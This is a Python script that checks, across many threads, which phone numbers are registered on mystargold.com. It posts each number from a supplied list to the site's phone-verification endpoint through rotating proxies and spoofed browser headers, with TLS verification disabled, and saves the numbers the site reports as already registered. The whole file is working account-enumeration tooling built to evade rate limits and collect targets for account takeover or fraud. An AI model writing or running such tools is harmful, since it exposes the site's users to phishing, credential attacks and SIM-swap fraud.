from concurrent.futures import ThreadPoolExecutor, as_completed
from sys import argv
from os import path
from requests import post, packages
from time import sleep

packages.urllib3.disable_warnings()
packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
try:
    packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

"""number proxies(none for none) num_threads timeout sleep"""

proxyCounter = 0
proxyLength = 0
requestTimeout = 0
sleepTime = 0
poolThread = []
finishedWriter = open('finished.txt', 'w+', buffering=1)
validWriter = open('valid.txt', 'a+', buffering=1)
respWriter = open('resp.txt', 'w+', buffering=1)
proxyList = None


def accountChecker(phoneNumber):
    global proxyCounter
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'mystargold.com',
        'Origin': 'https://mystargold.com',
        'Referer': 'https://mystargold.com/register/index',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }
    postData = {'phoneNumber': phoneNumber}

    proxyDict = {'http': proxyList[proxyCounter % proxyLength]}
    proxyDict['https'] = proxyDict['http']
    proxyCounter += 1

    while True:
        try:
            resp = post('https://mystargold.com/register/verifyPhoneNumber',
                        data=postData, proxies=proxyDict, verify=False, timeout=requestTimeout, headers=headers)
            sleep(sleepTime)
            print('checked phoneNumber %s' % phoneNumber)
            respWriter.write("---%s----\n%s\n" % (phoneNumber, resp.content))
            if 'Phone # is already registered' in str(resp.content):
                return True, phoneNumber
            return False, phoneNumber
        except Exception as e:
            del proxyList[proxyCounter]
            proxyCounter += 1
            print('changing proxy for phoneNumber %s' % phoneNumber)
        proxyDict = {'http': proxyList[proxyCounter % proxyLength]}
        proxyDict['https'] = proxyDict['http']


if len(argv) == 6:
    sleepTime = int(argv[5])
    requestTimeout = int(argv[4])
    if path.isfile(argv[1]) and path.isfile(argv[2]):
        with open(argv[1], 'r') as accountReader, open(argv[2], 'r') as proxyReader:
            proxyParser = lambda valid, proxyIp, proxyPort, proxyType: proxyType + '://' + proxyIp + ':' + proxyPort
            proxyList = proxyReader.readlines()
            proxyLength = len(proxyList)
            executor = ThreadPoolExecutor(max_workers=int(argv[3]))
            for account in accountReader.readlines():
                account = account.strip()
                if account:
                    print('checking phoneNumber %s' % account)
                    poolThread.append(executor.submit(accountChecker, account))

            for future in as_completed(poolThread):
                result = future.result()
                validWriter.write('%s\n' % result[1]) if result[0] else None
                finishedWriter.write('%s\n' % result[1])
                validWriter.flush()
                finishedWriter.flush()
